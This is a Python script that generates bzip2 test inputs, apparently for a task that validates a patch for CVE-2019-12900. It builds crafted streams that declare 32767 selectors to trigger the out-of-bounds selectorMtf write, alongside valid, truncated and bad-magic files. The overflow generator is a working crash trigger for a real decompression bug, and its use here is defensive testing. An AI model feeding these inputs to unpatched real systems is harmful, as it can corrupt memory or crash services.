#!/usr/bin/env python3
"""Generate deterministic bzip2 inputs for the target test suite.

The selector-overflow inputs exercise CVE-2019-12900: the decoder reads a
15-bit selector count and writes that many entries into a fixed-size
``selectorMtf`` array.  The base version has no bound; the correct patch adds
the upstream 1.0.8 guard and clamp.
"""

from __future__ import annotations

import bz2
import sys
from pathlib import Path


class BitWriter:
    def __init__(self) -> None:
        self.bits: list[int] = []

    def write(self, value: int, width: int) -> None:
        for shift in range(width - 1, -1, -1):
            self.bits.append((value >> shift) & 1)

    def write_bytes(self, data: bytes) -> None:
        for byte in data:
            self.write(byte, 8)

    def to_bytes(self) -> bytes:
        padded = self.bits + [0] * ((8 - len(self.bits) % 8) % 8)
        output = bytearray()
        for index in range(0, len(padded), 8):
            byte = 0
            for bit in padded[index:index + 8]:
                byte = (byte << 1) | bit
            output.append(byte)
        return bytes(output)


def selector_overflow(selectors: int) -> bytes:
    """Build a stream that reaches the selector loop with ``selectors`` entries."""
    writer = BitWriter()
    writer.write_bytes(b"BZh1")          # magic + block size 1
    writer.write_bytes(b"1AY&SY")        # block header
    writer.write_bytes(b"\x00\x00\x00\x00")  # block CRC (not checked before the overflow)
    writer.write(0, 1)                   # randomised flag
    writer.write(0, 24)                  # origPtr
    writer.write(1, 1)                   # inUse16[0] = 1
    writer.write(0, 15)                  # remaining inUse16 bits
    writer.write(1, 1)                   # inUse[0] = 1
    writer.write(0, 15)                  # remaining inUse bits
    writer.write(2, 3)                   # nGroups = 2
    writer.write(selectors, 15)          # nSelectors
    # The vulnerable write happens at index 18002.  Emitting one bit per
    # selector up to that point keeps the reproducer small while preserving the
    # declared selector count used by the incomplete patch.
    for _ in range(min(selectors, 18003)):
        writer.write(0, 1)               # selector MTF value 0
    # The overflow happens while reading the selectors.  Pad with zero bits so
    # the decoder has enough input to reach the out-of-bounds write.
    writer.write(0, 8 * 64)
    return writer.to_bytes()


def main() -> int:
    root = Path(__file__).resolve().parent.parent
    inputs = root / "inputs"
    inputs.mkdir(parents=True, exist_ok=True)

    text = b"security patch validation target\n" * 8
    (inputs / "valid-block9.bz2").write_bytes(bz2.compress(text, compresslevel=9))
    (inputs / "valid-block1.bz2").write_bytes(bz2.compress(text, compresslevel=1))
    (inputs / "valid.txt").write_bytes(text)
    (inputs / "selector-overflow.bz2").write_bytes(selector_overflow(32767))
    (inputs / "selector-overflow-alt.bz2").write_bytes(selector_overflow(32766))
    (inputs / "invalid-magic.bz2").write_bytes(b"not a bzip2 stream\n")
    valid = (inputs / "valid-block9.bz2").read_bytes()
    (inputs / "truncated.bz2").write_bytes(valid[: len(valid) // 2])
    print(f"wrote inputs to {inputs}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
